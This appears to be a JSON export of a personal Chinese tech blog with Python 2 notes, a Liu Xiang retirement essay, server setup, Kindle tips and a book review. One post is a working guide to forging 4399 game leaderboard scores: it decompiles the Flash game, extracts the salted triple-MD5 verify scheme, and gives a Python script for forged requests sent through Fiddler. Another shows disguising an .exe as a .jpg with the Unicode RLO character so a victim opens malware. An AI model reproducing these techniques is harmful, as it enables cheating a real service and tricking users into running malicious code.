如果要取最后一个元素，除了计算索引位置外，还可以用-1做索引，直接获取最后一个元素： 1print classmates[-1] #Tracy 以此类推，可以获取倒数第2个、倒数第3个： 12print classmates[-2] #Bobprint classmates[-3] #Michael 添加和删除： 123classmates.append(&#39;Adam&#39;) 添加到末尾classmates.insert(1, &#39;Jack&#39;) 添加到指定位置classmates.pop() 删除最后一个元素。要删除指定位置的元素，用pop(i)方法，其中i是索引位置 要把某个元素替换成别的元素，可以直接赋值给对应的索引位置： 1classmates[1] &#x3D; &#39;Sarah&#39; ist里面的元素的数据类型也可以不同，比如： 1L &#x3D; [&#39;Apple&#39;, 123, True] list元素也可以是另一个list，比如： 12s &#x3D; [&#39;python&#39;, &#39;java&#39;, [&#39;asp&#39;, &#39;php&#39;], &#39;scheme&#39;]print len(s) #4 2.tuple tuple和list非常类似，但是tuple一旦初始化就不能修改，它也没有append()，insert()这样的方法。其他获取元素的方法和list是一样的，你可以正常地使用classmates[0]，classmates[-1]，但不能赋值成另外的元素 1classmates &#x3D; (&#39;Michael&#39;, &#39;Bob&#39;, &#39;Tracy&#39;) 3.dict 其他语言中也称为map,使用键-值（key-value）存储 用Python写一个dict如下： 12d &#x3D; &#123;&#39;Michael&#39;: 95, &#39;Bob&#39;: 75, &#39;Tracy&#39;: 85&#125;print d[&#39;Michael&#39;] #95 判断key是否存在： 123d &#x3D; &#123;&#39;Michael&#39;: 95, &#39;Bob&#39;: 75, &#39;Tracy&#39;: 85&#125;print &#39;Bob&#39; in d #Trueprint &#39;bob&#39; in d #False 通过dict提供的get方法，如果key不存在，可以返回None，或者自己指定的value： d.get('Thomas') d.get('Thomas', -1) 要删除一个key，用**pop(key)** 再来看样例2： 123a &#x3D; &#123;&#125;a.setdefault(&#39;b&#39;,1)print a.items(),a.keys(),a.values() setdefault('b',1) 如果key b不存在的话，就插入并且值设为1 而items=keys+values 即key和对应的value 4.set 要创建一个set，需要提供一个list作为输入集合： 12s &#x3D; set([1, 2, 3])print s #set([1, 2, 3]) add(key)方法可以添加元素到set中 remove(key)方法可以删除元素： set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作，也可以用in 来判断是否在集合中： 123456s1 &#x3D; set([1, 2, 3])s2 &#x3D; set([2, 3, 4])print s1 &amp; s2 #set([2, 3])print s1 s2 #set([1, 2, 3, 4])print 1 in s1 #Trueprint 5 in s1 #False （四）函数 1.定义 def name (params): 123456def my_abs(x): if x &gt;&#x3D; 0: return x else: return -x 2.通过字符串调用Python函数 假如遇到下面这种情况：我们的函数名就差几个字母（因为是不同情况下的方法），难道要写个if elif 判断？ 答案是No!这样太丑了！简直不忍直视！ 答案是用eval(func_name)(params)进行调用！ eg: 12345678910# -*- coding:utf-8 -*-def hrsay_a(content): print contentdef hrsay_b(): print &#39;1&#39;func_a &#x3D; &#39;hrsay_&#39;+&#39;a&#39;eval(func_a)(&quot;I&#39;m a handsome boy&quot;) 输出： I'm a handsome boy （五）觉得很爽的玩意 1.长度 求任意类型的长度统一： 1len(xxx) 不像某语言，又size又length的 2.幂运算 python 的幂运算 如x的五次方，不必写pow(x,5)了，这么写太丑了。 直接x * 5 （两个 代表幂运算，perl也有这个） 3.切片 切片是最爽的功能： 看下面的例子你就秒懂了 12345678910x&#x3D;range(10,100); #x是个listprint x[:10 ] #输出前10个print x[-10 :] #输出后10个print x[:10 :3 ] #输出前10个，每3个取一次print x[::2 ] #每两个取一次print x[::-2] #倒着每两次取一个[10, 11, 12, 13, 14, 15, 16, 17, 18, 19][90, 91, 92, 93, 94, 95, 96, 97, 98, 99][10, 13, 16, 19][10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 66, 68, 70, 72, 74, 76, 78, 80, 82, 84, 86, 88, 90, 92, 94, 96, 98] Python简洁优雅的风格一览无遗啊！！！！ （六）循环进阶 1. range和xrange range和xrange如果从0开始，都可以省略0。 他们的用法一样: 下面四句都是等价的，即循环从[0,10) 不包括10 1234for i in range(10): for i in range(0,10):for i in xrange(10): for i in xrange(0,10): 在Python2中，range直接生成了一个list，占用空间大，而xrange是生成一个迭代器，占用资源小，效率高，推荐后者。 PS:python3中删除了range的实现，改为xrange的实现方法。同时保留了xrange。 2. for 从大到小 你以为For循环只能从小到大么？ 一开始学的时候我还觉得不科学，其实不是的。 下面的代码输出从10~1的数：是的，它和切片一样，最后一个都是表示步长 12for i in xrange(10,0,-1): print i 四、数组 数组创建和初始化 12a &#x3D; [0] * 10 #一维数组b &#x3D; [[0 for j in xrange(10)] for i in xrange(10)] #二维数组 warning: 二维数组不能采用如下方法进行初始化（这样只是浅拷贝） 1234a &#x3D; [[0]*3]*3 #想要生成3*3的二维数组print aa[0][0]&#x3D;1print a Output: 12[[0, 0, 0], [0, 0, 0], [0, 0, 0]][[1, 0, 0], [1, 0, 0], [1, 0, 0]] 五、字符串 写过其他高级语言的都知道，字符串的连接用 + ，字符串复制 = ,分割字符串split （一）字母转化 1.大小写转化 12345name &#x3D; &#39;Hrwhisper&#39;upper_name &#x3D; name.upper() #大写lower_name &#x3D; name.lower() #小写print upper_nameprint lower_name 输出： HRWHISPER hrwhisper 2. ASCII编码转化 12print chr(65) #Aprint ord(&#39;A&#39;) #65 （二）join 数组转字符串 12a &#x3D; range(10)print &#39;&#39;.join(str(i) for i in a) 字符串插值 12a &#x3D; &#39;&#39;.join(str(i) for i in xrange(10))print &#39;,&#39;.join(a) （三）切片 给定字符串位置进行复制 12a &#x3D; &#39;&#39;.join(str(i) for i in xrange(10)) #0~9print a[3:6] #3~5 翻转字符串 12a &#x3D; &#39;&#39;.join(str(i) for i in xrange(10)) #0~9print a[::-1] #9~0 字符串排序 1str&#x3D; &quot;&quot;.join((lambda x:(x.sort(),x)[1])(list(str))) 去除末尾换行 1line &#x3D; str.strip( &#39;&#39;) 六、栈和队列 python其实并没有这两个玩意，但是有list足矣。 栈 由于栈是后进先出，每次入栈，还是直接append()，出栈我们只需要pop()，即可 1234a &#x3D; range(5)a.append(5)print a.pop() #5print a #0~4 队列 由于栈是先进先出，每次入队,还是直接append()，出队我们只需要pop(0)，即可 1234a &#x3D; range(5)a.append(5)print a.pop(0) #0print a #1~5 是不是比某写语言爽！！！ 七、文件 推荐如下写法：每次读取一行，并且自带文件关闭。 123with open (&#39;e:\\My Clippings.txt&#39;) as f: for line in f: print line 毕竟咱总不至于非要这么写吧... 123456try: f &#x3D; open(&#39;&#x2F;path&#x2F;to&#x2F;file&#39;, &#39;r&#39;) print f.read()finally: if f: f.close() 对于打开一个文件，可以有如下三种读取方法： read()一次性读取全部，适用于小文件。 read(size) 每次读取size 个大小，适用于文件大小未知。 readlines() 每次读取一行，可以来读配置文件 12for line in f.readlines(): print(line.strip()) # 把末尾的&#39;\\n&#39;删掉 八、类 变量命名 xxx ：特殊的变量，可以直接访问。 __xxx：就是private 其他的为Public 有些时候，你会看到以一个下划线开头的实例变量名，比如_name，这样的实例变量外部是可以访问的，但是，按照约定俗成的规定，当你看到这样的变量时，意思就是，“虽然我可以被访问，但是，请把我视为私有变量，不要随意访问 八、除此之外，你还可以学： 各种科学库 python 科学计算 — numpy 学习笔记 python matplotlib 库学习笔记 爬虫 python２爬虫入门 python 爬虫之模拟登陆实战（一）微人大 python 爬虫之模拟登陆实战（二）百度","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"}]},{"title":"( ^_^ )/~~拜拜， 刘翔","slug":"say-goodbye-for-liuxiang","date":"2015-04-07T15:30:52.000Z","updated":"2020-10-22T14:55:46.437Z","comments":true,"path":"say-goodbye-for-liuxiang/","link":"","permalink":"https://www.hrwhisper.me/say-goodbye-for-liuxiang/","excerpt":"刘翔退役。","text":"刘翔退役。 好久没看到关于 刘翔 的新闻了， 这一次，一看到就是： 刘翔退役。 下面的评论区依旧有人骂声一片。 为什么骂他？ 因为他在08年奥运会退赛了，在12年伦敦奥运会上摔倒了。 还是因其太出色、嫉妒？ 还是因为如今的人们缺少一种信仰，需要一个人来承担？ 记得08年的时候，我妈曾说，刘翔 退赛了，有好多买 刘翔 的都输了。 呵，一群赌徒。 往下拉，有一篇新闻标题是：《 刘翔 48次大赛36金6银3铜 有人只记得他2次退赛》 你还记得吗? 他在雅典奥运会上说,”谁说黄种人不能拿奥运会前八!我今天一定要证明给大家看，我是奥运会冠军，我相信梦想一定会变为现实的“ 他06年12‘88的记录， 我只觉得满腔的感动。 到后来，08年，我爸看奥运会也只看 刘翔 ，我在一旁跟着看，结果他退赛了，我也失望了。 12年伦敦，他跨第一栏失败，直接倒地，我也看着，都惊呆了。 他单脚跳到了终点，亲吻护栏，其实他就已经在告别， 翔飞人身上的伤病，已经不能继续在栏天下飞翔。 那些谩骂的人，还请放过他， 不要说他是因为演不下去了，才选择退役，人总会老去。 就像我现在喜欢的梅西，有一天他也会老了，踢不动了， 就像我现在喜欢的eason，有一天他也会沙哑了，不唱了。 你不能因为喜欢他们，就要求他们一直继续下去， 他们也有他们的生活。 把一个国家所有的希望寄托在一个人的身上，那是不公平的。 不能总是说成者为王败者为寇，谁都想赢，但总有输家。 前阵子英超-利物浦-杰拉德退役（虽然我不关注）,我看到评论有人感叹: 看到他们,就像看到十年前的我,那时候我二十二岁…… 那些陪伴我们的人啊，记住他们给我们带来的感动， 他们有他们的生活， 即使他们曾经让你们失望， 就算他是错的, 但是再耀眼的人,总会有背对着我们的光斑, 人无完人,最重要的是去改正。 在离开的时候， 请祝福他们。 刘翔之后，再无 刘翔 。 但 刘翔之后，未必再无飞人。 期待接替他的飞人出现，也祝福他一路走好。 嗯，我不是在诅咒他。 ( ^_^ )/~~拜拜， 刘翔 。","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"Win下的JSP应用向Linux迁移","slug":"windows-jsp-application-to-linux","date":"2015-04-07T03:30:39.000Z","updated":"2020-10-22T14:25:24.262Z","comments":true,"path":"windows-jsp-application-to-linux/","link":"","permalink":"https://www.hrwhisper.me/windows-jsp-application-to-linux/","excerpt":"上学期做的twitter热点话题跟踪， 采用jsp &amp;&amp; servlet &amp;&amp; mysql ，服务器是tomcat 上周五老师叫我把我做的JSP网站放在他的服务器上。 给下届学生学习 - -。","text":"上学期做的twitter热点话题跟踪， 采用jsp &amp;&amp; servlet &amp;&amp; mysql ，服务器是tomcat 上周五老师叫我把我做的JSP网站放在他的服务器上。 给下届学生学习 - -。 路上还遇到萌妹纸邀请我一起去逛街。 可是要找老师啊！ 扯远了，老师给我的服务器几乎就是全新的，啥玩意都没有， 下面讲讲我的配置过程。 一、mysql 1.安装 如果你的linux没有安装mysql，那么请在终端中输入如下内容： 1sudo apt-get install mysql-server 中途会弹出设置root用户的密码。 几乎就是一键式安装，Linux开发爽啊。。 2.创建数据库 终端中输入： 1mysql -u root -p 然后输入刚才安装的密码，即可进行登陆。 接下来输入 1create database twitter; 即创建了名为twitter的数据库。 简单的介绍下命令行的mysql： 语句以;结束。 显示数据库 show databases; 创建数据库 create database 数据库名; 改变当前的数据库 use 数据库名; 显示当前数据库的表 show tables; 基本操作就这些，其他的SQL语句和平常的差不多吧。 二、安装tomcat 1.java环境 终端中输入： 1java -version 来查看java版本号，如果不存在，那么使用 1apt-get insall default-jre 2.下载tomcat 1）下载apache-tomcat-8.0.21.tar.gz 2）#tar -zxvf apache-tomcat-8.0.21.tar.gz ；//解压 3）#cp -R apache-tomcat-8.0.21.tar.gz /usr/local/tomcat ；//拷贝apache-tomcat-8.0.21.tar.gz到/usr/local/下并重命名为tomcat 4） /usr/local/tomcat/bin/startup.sh； //启动tomcat 最后使用浏览器访问 http://localhost:8080，出现tomcat默认页面，说明已经安装成功。 三、数据库恢复 由于是移植，那么我们需要把原来的数据库转移到新的机器上。 在原来的机器上备份好后，拷贝到新的机器上。 1cat twitter.sql mysql -u root -p twitter 输入密码即可。 四、附上其他的一些细节 1. 连接上服务器 我用的是SSHSecureShellClient这个软件，服务器设置必须SSH才能连上。 下载安装后，运行SSH Secure Shell Client，点击Quick Connect ,弹出如图的配置窗口 2015.4.7 server config1 Host Name:填上服务器IP User Name:填上服务器的用户，比如root Port:不需要改，SSH端口就是22 Authentication：验证方式，我们用的是密码验证，就选Password (SSH还有证书验证啥的) 配置完后点击connect，输入密码就进入了我们熟悉的终端了。 2. 上传文件 同样的，上面的SSHSecureShellClient 安装完会有一个SSH Secure File Transfer Client软件，这是用来上传的。 SSH传送文件而不是FTP。 打开该软件，配置如第一步就可以啦。 2015.4.7 server config2","categories":[{"name":"开发环境/开发工具","slug":"开发环境-开发工具","permalink":"https://www.hrwhisper.me/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"},{"name":"JSP","slug":"JSP","permalink":"https://www.hrwhisper.me/tags/JSP/"}]},{"title":"kindle 技巧 整理","slug":"some-tricks-for-using-kindle","date":"2015-04-06T05:16:56.000Z","updated":"2021-01-08T13:42:14.033Z","comments":true,"path":"some-tricks-for-using-kindle/","link":"","permalink":"https://www.hrwhisper.me/some-tricks-for-using-kindle/","excerpt":"kindle 技巧 整理。 包括如下几个方面： 将书籍通过邮件到kindle 网页内容推送到kindle 其他技巧","text":"kindle 技巧 整理。 包括如下几个方面： 将书籍通过邮件到kindle 网页内容推送到kindle 其他技巧 一、邮件发送书籍到kindle 懒得找数据线？ 以国行的kindle为例，打开 www.amazon.cn ，进入我的账户-管理我的内容和设备-设置 1.个人文档设置自定义接受邮件的地址 这个设置的地址即收件地址，就是你把邮件发给这个地址即可 2015.4.6 kindle1 2.将发件地址设为白名单 在已认可的发件人电子邮箱列表中加入你要发送的邮箱地址。（即发件人的邮箱） 2015.4.6 kindle 2 3.发送邮件 2015.4.6 kindle 3 等一会儿，kindle就可以接受推送了~ PS:如果附件为PDF或者其他格式，在电子邮件主题栏输入“Convert”，系统会自动把PDF转换成适合Kindle阅读的格式! 支持的文件类型： Microsoft Word (.DOC, .DOCX) HTML (.HTML, .HTM) RTF (.RTF) Text (.TXT) JPEG (.JPEG, .JPG) Kindle 格式(.MOBI, .AZW) GIF (.GIF) PNG (.PNG) BMP (.BMP) PDF (.PDF) 二、网页内容推送到kindle 遇到很长的网页觉得看起来不舒服？ 或者很好的内容没时间看，怕忘了？ 或者有想放在坐地铁/等车的时候看的网页内容？ 没事，我们可以从网页中推送到kindle！ 推荐使用chrome浏览器，装上如下的两个插件（其实装一个就可以了，不过有时候一个可能效果不是很好，就换另一个） Push to Kindle Send to Kindle (by Klip.me) 1.Push to Kindle 在想要保存的网站点击该插件即可。 需要把kindle@fivefilters.org加入发送白名单。（见上面发送邮件的第二步） 在send to 一栏中写上你kindle接受的地址即可~ 2015.4.6 kindle4 同样的，等一会儿，kindle就可以收到推送了~ 2.Send to Kindle (by Klip.me) 需要把kindle@klip.me加入发送白名单。 在我的kindle邮箱地址填入你kindle接受的地址即可~ 2015.4.6 kindle 5 之后，在想要发送的网页点击send to kindle即可。 下面是预览图 2015.4.6 kindle 6 三、其他技巧 1.截屏 同时轻触左上角和右下角的屏幕可以截屏，对角线另一半也可以。 查看结果：用数据线连接电脑后查看根目录，就能得到已保存的截屏图片。 2.用Kindle自带的浏览器上网页版QQ 3.快速的切换阅读进度模式 在书中点击左下角 4.手指在屏幕上捏合或张开可以缩放字号","categories":[{"name":"技术改变生活","slug":"技术改变生活","permalink":"https://www.hrwhisper.me/categories/%E6%8A%80%E6%9C%AF%E6%94%B9%E5%8F%98%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"kindle","slug":"kindle","permalink":"https://www.hrwhisper.me/tags/kindle/"}]},{"title":"我也想和这世界谈谈","slug":"i-want-to-talk-to-the-world","date":"2015-04-05T13:47:26.000Z","updated":"2020-10-19T14:35:48.742Z","comments":true,"path":"i-want-to-talk-to-the-world/","link":"","permalink":"https://www.hrwhisper.me/i-want-to-talk-to-the-world/","excerpt":"当做《1988：我想和这世界谈谈》书评","text":"当做《1988：我想和这世界谈谈》书评 我也想和世界谈谈，在还没看韩寒的书之前。 他说 丁丁哥哥说，我要去北方。 我说，哇，带我一起去吧。 丁丁哥哥说，不行，你太小了。 我说，我坐火车不用钱的。 丁丁哥哥说，不行，你太大了。 我说，丁丁哥哥，你去做什么啊？ 丁丁哥哥说，我去和他们谈谈。 我说，你和谁谈谈啊？ 丁丁哥哥唇边露出微笑，急切地说，这个世界。 我说，哇噢。 他说，我去和这世界谈谈。 于是丁丁哥哥挥挥手，一路北上， 却再也没有回来。 我记得他热血的模样， 记得他说，他要和这世界谈谈， 却没弄懂他是怎么死的。 后来我看了豆瓣，才知道 丁丁哥哥是死于one nine eight nine。 那一年。传说中的学潮。 所以书名要叫做1988，是么。 那些有的人一直试图掩盖的真相， 因为那毕竟不是什么光彩的事。 就和小日本一样， 想要抹杀二战时自己曾犯下的错误。 其实谁都想将不好的事情试图去掩盖。 只不过那不是个坚强的人。 而只因为“领导”犯下的错误，无论是士兵还是学生血流成河，无论是二战日本还是学潮。 “领导”是左倾、右倾还是东倒西歪，其实都和我没太大的关系。 我只是觉得有点可悲,多少应该流在身上的热血，就这么被涂在了地上。 爱情啊 “其实温水煮不了青蛙的，不要以为现实可以改变你，不要被黑夜染黑，你要做你自己，现实其实没有你想象的那么强大，现实不过是只纸老虎…… 砰的一声巨响。孟孟赶在青蛙往外跳之前，一把用盖子扣住了锅，旋即把火开到最大，青蛙则在里面乱跳，我看得心惊胆战。 孟孟一手用力按住，一边转身直勾勾地看着我，说，这才是现实。” 在后会无期中,这段话被排成了电影,只不过,\"我\"和\"孟孟\"换成了马浩汉和江河。 而我们的现实是：不愿意付出，却想着有个人死心塌地的爱着自己。 好想和这世界谈谈。 这世界究竟怎么了。 年轻人们他们不读韩寒，只看日韩，无论动漫还是偶像剧；他们不关注事实，偶尔写写文章却不知道王小波是何许人物；愿意看着两个小时的电影而不愿意去读原书，愿意行遍大江南北而却没有和心灵一起上路。 社会充满了快餐文化，一切都是速成的。 你看书名：ＸＸ天精通XXXX。 如果一个年轻人的内心充满的都是想要成功的欲望，那么他的内心是绚丽的还是贫瘠的？ 成功，成功，最普遍的精神鸦片，每个人都不由自主的想要沾上边。 成功，成功，而衡量他的最普遍的方法却是，我赚了多少的钱。 RUC的建筑，几乎每年都有外貌的装修，校长大人只想着修缮外观，却不去丰富内在的美。 就如同一个只注重自己外表的人,她考虑的是如何去打扮自己,而不愿去修身养性。 而我们大多数人自己做错了什么首先想到的是试图掩盖,而不是补救； 愿意去找适合的人，却没有想过成为适合的那个人。 以爱的名义要求对方给自己自由，却滥用自己的自由。 突然想起前阵子看的《阿甘正传》 主角阿甘，他的智商只有70。 大家都说他是傻子。 因为傻，一次次的被人嘲笑， 因为傻，一次次的被所爱的人背叛——那个说要变成一只鸟飞走的女子。 那个总是说：阿甘，你不懂什么是爱。 他难过么,当然难过，但是我爱你。 我可以等。宁愿笨也不想要悔恨。 于是历史一次次的循环，总统一次次的遇刺，珍妮一次次的背叛。 是因为他不够聪明吗？所以珍妮不爱他？ 后来，他去找到珍妮的时候， 在知道珍妮有自己的孩子时候，紧张的问，他聪明吗？ 我那时候是心疼了。 那个南阿拉巴马的傻瓜阿甘，最终如愿以偿，娶了珍妮，有个小阿甘。 珍妮很快的死了。 在影片最后，当阿甘站在珍妮墓前，缓缓的说： I miss you Jenny if there's anything you need. I won't be far away.. 我承认我刚才回放的时候矫情的哭了。 不为他最后如愿以偿的娶了珍妮，而为这个傻瓜懂得许多聪明人没有的感情——爱情。 而那些自以为拥有了爱情的聪明人其实并没有得到爱，也不知道什么是爱。 这个傻瓜——我愿意称他为傻瓜，傻瓜有一种疼爱的味道。 也许我们才是傻子。 那你明白吗？ 什么才是爱情？ 刚看静扬的博客上说：“想起李洋前几天跟我说的，『你觉得找老婆是要找很漂亮的但却会花钱，还是找不怎么漂亮的，却会过日子的。』当时我随口回答到，主要还是看感觉。可是真的是靠感觉吗？理性不是应该最终大于感性吗？所以如给我再一次机会，或许我会和他一样，毫不犹豫的说『当然是会过生活』” 我也一样，必须是会过日子的。 琴棋书画诗情画意，永远只能来点缀生活，柴米油盐酱醋茶，才是生活的全部。 “如果对于明天没有要求，牵牵手就想旅游。”（《十年》） 岁月，需要怎样荒芜一颗心，才会甘愿就此沉沦？ 那么随便的找个人度过余生多么简单。 随便的找个人牵牵手就当做是约定。 只是我不甘心找个素昧平生的人。 那些口口声声的说不愿意将就的人， 是因为无法忘却曾经的人， 还是因为不愿意去了解眼前的人？ 爱情不能是不作为。 那些说我们最后没有在一起的， 你们努力的在一起过了吗？ 那些说分手后还要做朋友的， 你们联系过对方吗？ 还是多了一个躺在通讯录角落里的名字，然后切断所有连向它的方式？ 人们埋怨一成不变，但也埋怨居无定所，人们其实都无所谓，只是要给日子找点岔子而已，似乎只有违背现在的生活，才真正懂得了生活，生活就是一个婊子、一个戏子、一个你能想到的—切，你所有的比喻就往里面扔吧，你总是对的。因为生活太强大了，最强者总是懒得跟你反驳，甚至任你修饰，然后悄悄地把锅盖盖。 而她曾猛然的把我的锅盖盖住。 我在里面咒骂，比谁都爱过，也比谁都恨过。 做错的人，需要弥补就是了。 我没有做错什么。 我只是想找回她。 又花费了好几个月的勇气。 这一次，我至少是勇敢的，我承认的朋友们也会赞许我的行为，因为他们都会是这样的人，你也许会为我流泪，但也许心中会说，你太蠢了。 是蠢吧，是傻吧。 我都认了。 如果你还在的话，会不会心疼的说一句傻瓜。 （待修改）","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"python 相关 环境","slug":"python-running-environment-opencv-mysqldb","date":"2015-04-01T01:28:37.000Z","updated":"2021-01-08T13:42:14.029Z","comments":true,"path":"python-running-environment-opencv-mysqldb/","link":"","permalink":"https://www.hrwhisper.me/python-running-environment-opencv-mysqldb/","excerpt":"本文包括： 安装python环境 eclipse安装 python 插件——pydev python 安装 opencv python 安装MySQLdb（windows）","text":"本文包括： 安装python环境 eclipse安装 python 插件——pydev python 安装 opencv python 安装MySQLdb（windows） 一、安装Python windows：请下载Anaconda（包含各种库和python环境） linux: 一般自带，没有的话就输入Python，应该会有提示apt-get install 安装的命令 ps:如果你已经安装了python，那么请跳转第三步，在eclipse 下安装pydev插件，便于开发。( 当然，更推荐使用Pycharm ) : ) 二、安装 pydev 打开eclipse，点击help-&gt; install new software，在弹出的窗口点击add如图，输入如图内容（Name可以随便写） 我输入的是PyDev，Location是http://pydev.org/updates pydev install 在接下来的选择pydev，一路next即可。 pydev install2 附- pydev使用攻略 在file -&gt;new 中找到pydev，没有的话就是在others QQ截图20150510210116 QQ截图20150510210138 新建出来之后如图： 在src右键new - PyDev module QQ截图20150510210213 QQ截图20150510210245 其中，前1~5行是模版自己给的 我们可以在最后一行输入print 'hello world' QQ截图20150510210442 但这样直接运行会报错，因为为中文字符。 请在第一行中加入 # -- coding: utf-8 -- 意思为文件编码为utf-8 按ctrl + f11即可直接运行，结果如下图： QQ截图20150510210521 三、安装 opencv 如果你需要处理图像，可以使用opencv。 大多数网上的opencv安装挺复杂，我这里只需要几步。 首先前往http://opencv.org/downloads.html下载，我下的版本是2.4.10 安装opencv需要numpy等库。（安装py的时候你可以装（Anaconda）直接搞定所。） 下载好后，进行解压缩，打开opencv\\2.7，看你系统是32位选X86，64位选X64，将里面的cv2.pyd复制到python安装目录-packages下即可。 然后试试： 1import cv2 不报错即OK。 四、安装MySQLdb 前往 http://www.codegood.com/downloads 下载你系统和python对应的版本 比如博主我的为win8,64位，2.7版本，于是下载 MySQL-python-1.2.3.win-amd64-py2.7.exe 下载后双击安装即可。 接着执行如下： 1import MySQLdb 不报错即安装成功。","categories":[{"name":"开发环境/开发工具","slug":"开发环境-开发工具","permalink":"https://www.hrwhisper.me/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"环境配置","slug":"环境配置","permalink":"https://www.hrwhisper.me/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}]},{"title":"教你如何刷 4399 小游戏的分数！","slug":"get-a-good-score-you-like-at-4399","date":"2015-03-30T11:12:10.000Z","updated":"2021-01-08T13:42:14.093Z","comments":true,"path":"get-a-good-score-you-like-at-4399/","link":"","permalink":"https://www.hrwhisper.me/get-a-good-score-you-like-at-4399/","excerpt":"4399刷分攻略。 给妹纸秀一秀可以，禁止商业用途和恶意刷分！","text":"4399刷分攻略。 给妹纸秀一秀可以，禁止商业用途和恶意刷分！ 战前准备 首先打开4399一个小游戏的网站，本文以flippy bird为例（http://www.4399.com/flash/131199_4.htm ） 下载flash到本地 下载的方法有很多种，如果你不知道的话，我教你个简单的 IE打开上述网站。 打开IE设置，如图：点击设置-查看文件 在打开的文件中,有各种flash（你打开看看，会发现是main.swf这个文件才是我们的游戏） 查找加密函数 为啥要找加密函数？之后会告诉你，心急的直接跳过。 打开flash反编译（我用的是JPEXS Free Flash Decompiler） 把文件拖入，definebinayData那得右键选择open swf inside才能继续展开 经过一番查找，我最后在mainTimeline中找到进行加密的函数如下： 进行了三次MD5！ (PS:这个语言是actionscript) 实战检验 我先剧透一下：全站均采用这个加密函数！ 不信？我们用黄金矿工做检验。（比较好提交，地址为：http://www.4399.com/flash/3883.htm ） 打开fiddler攻击，玩一局游戏尝试进行提交分数，发现发送了如下内容： 我写了个python脚本进行计算MD5值，在对应的位置填写对应东西(一个游戏中，gs，只需要改其他几个) 你看计算的vertify和发送的是一模一样的！ 也就是说，我们只要把分数改为我们相要的分数，并且提交相应的vertify即可！ 实战结果 当你打完一局，可以提交分数的时候，用fiddler将包拦截下来，修改score和对应的vertify，然后发送。（之后来回的几个包也要放行）这样，你就会看到： 2015.3.30 result 关掉fiddler的拦截，刷新页面，看看排行榜~ 2015.3.30 result2 我的MD5加密代码 123456789101112131415# -*- coding: utf-8 -*-# author:hrwhisper# date :2015.3.30import hashlibgameID = &#x27;3883&#x27; #game idlGameScore = &#x27;101111&#x27; #you scoregs = &#x27;1&#x27; #gstemKey = &#x27;38c7d7b60ee491da&#x27; #game%5Fkeystarttime = &#x27;1427711758412&#x27; #starttime_tokenData = &#x27;a3b18d4ab6b1a8d2ecf987553674e297&#x27; #tokenverifyStr = &quot;SDALPlsldlnSLWPElsdslSE&quot; + temKey + lGameScore + gameID + starttime + gs + _tokenData + &quot;PKslsO&quot;;verify = hashlib.md5(hashlib.md5(hashlib.md5(verifyStr).hexdigest()).hexdigest()).hexdigest()print verify","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"信息安全","slug":"study/信息安全","permalink":"https://www.hrwhisper.me/categories/study/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"将exe伪装为后缀名为图片格式！（GIF/JPG/BMP均可）","slug":"filename-extension-cheat-exe-to-gif-jpg-bmp","date":"2015-03-28T15:03:04.000Z","updated":"2021-01-08T13:42:14.093Z","comments":true,"path":"filename-extension-cheat-exe-to-gif-jpg-bmp/","link":"","permalink":"https://www.hrwhisper.me/filename-extension-cheat-exe-to-gif-jpg-bmp/","excerpt":"信息安全有一个很有意思的就是所见并不一定为真实。 比如：钓鱼网站。 今天我写的这个仅仅是一个很小的技巧。 如图，这是一个应用程序，但是它的后缀是jpg！！！ 2015.3.28 afterChangeName","text":"信息安全有一个很有意思的就是所见并不一定为真实。 比如：钓鱼网站。 今天我写的这个仅仅是一个很小的技巧。 如图，这是一个应用程序，但是它的后缀是jpg！！！ 2015.3.28 afterChangeName 具体方法 首先，新建一个名为：hrwhisper.gpj.exe的文件 2015.3.28 beforeChangeName 接着，按F2重命名，在第一个.（也就是g）的前面右键，插入unicode控制字符，选RLO changingName 完成后大功告成！ 2015.3.28 afterChangeName 其实这个是利用unicode的控制字符进行翻转字符串，而你也可以同理的使得exe伪装为其他任意文件格式！ 用途 这么简单的东西有什么用呢？ 假设场景如下： 如果对方是小白，那几乎不需要这种方法。 如果对方是大白：那么你发给他，他一看后缀，图片格式嘛！一打开，就中招了。（你的exe甚至可以写执行自己的恶意代码并且打开一个图像！这样他压根不会发觉！）","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"信息安全","slug":"study/信息安全","permalink":"https://www.hrwhisper.me/categories/study/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"python 科学计算 — numpy 